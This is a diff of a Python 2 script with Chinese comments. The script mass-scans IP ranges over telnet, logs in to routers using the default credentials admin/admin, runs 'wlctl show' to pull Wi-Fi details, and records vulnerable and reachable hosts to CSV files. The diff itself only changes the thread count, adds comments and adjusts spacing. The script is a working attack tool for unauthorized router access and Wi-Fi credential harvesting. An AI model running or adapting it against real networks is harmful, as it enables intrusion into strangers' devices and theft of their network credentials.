@@ -12,23 +12,20 @@ os.system("sysctl -w net.ipv4.route.flush=1")
 # 默认用户名和密码
 username = "admin"
 password = "admin"
-tn = 4000  # 设定每次并发的线程数量，目的是防止一次性导入大量ip消耗内存
+tn = 2000  # 设定每次并发的线程数量，目的是防止一次性导入大量ip消耗内存
 TIMEOUT = 10  # 设定超时为10秒，可以设置小一些，但是程序已经运行了，不想停下来
 fk = threading.Lock()  # 文件锁，在写入wifi信息时使用，确保完整写入一行
 fk_un = threading.Lock()  # 文件锁，已打开telnet连接，但是没有返回“username:”字符串，用于记录开放telnet端口的主机
 fk_nd = threading.Lock()  # 文件锁，应该为具有漏洞的路由器，但是已更改默认的用户名和密码，用于记录具有漏洞的路由器
 fk_er = threading.Lock()  # 文件锁，主机开机但是没有或者拒绝telnet连接，用于记录开机的主机
 
-
 def ip2num(ip):  # 将ip地址转换为数字
     ip = [int(x) for x in ip.split('.')]
     return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]
 
-
 def num2ip(num):  # 将数字转换为ip地址
     return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16,
                             (num & 0x0000ff00) >> 8, num & 0x000000ff)
-
 
 class bThread(threading.Thread):
     def __init__(self, ip):
@@ -40,6 +37,7 @@ class bThread(threading.Thread):
             tn = telnetlib.Telnet(self.ip, timeout=TIMEOUT)
             try:
                 un = tn.read_until("username:", TIMEOUT)
+                # 此时已建立telnet连接，但没有接收到“username:”，直接记录开放telnet的主机，关闭线程
                 if un.find("username:") < 0:
                     if fk_un.acquire():
                         tn_open_only_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
@@ -63,6 +61,7 @@ class bThread(threading.Thread):
             tn.write("wlctl show\n")
             try:
                 wlctl = tn.read_until("cmd:SUCC", TIMEOUT)
+                # 说明默认用户名和密码已更改，或者不支持wlctl命令，记录留待备查
                 if wlctl.find("cmd:SUCC") < 0:
                     if fk_nd.acquire():
                         not_default_login_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
@@ -176,10 +175,10 @@ if __name__ == "__main__":
                     " || " + "已处理 %d" % suma + " 个ip；每分钟处理 %.2f" % (suma / (time.time() - t1) * 60) + " 个ip"
             logfile.write(line2 + "\n\n")  # 记录时间、处理的ip总数、每分钟处理的ip数量
             logfile.flush()  # 将log记录flush并fsync，保存处理状态，可以断点续搜
-            os.fsync(logfile.fileno())
+            os.fsync(logfile.fileno())  # flush()和fsync()在频繁访问文件的背景下慎用，损耗性能
             print line2
 
-        if count > 0:  # 处理循环结束后剩余的ip地址
+        if count > 0:  # 处理循环结束后剩余的ip地址ssssds
             for ip in qu[:count]:
                 bThread(ip).start()
 
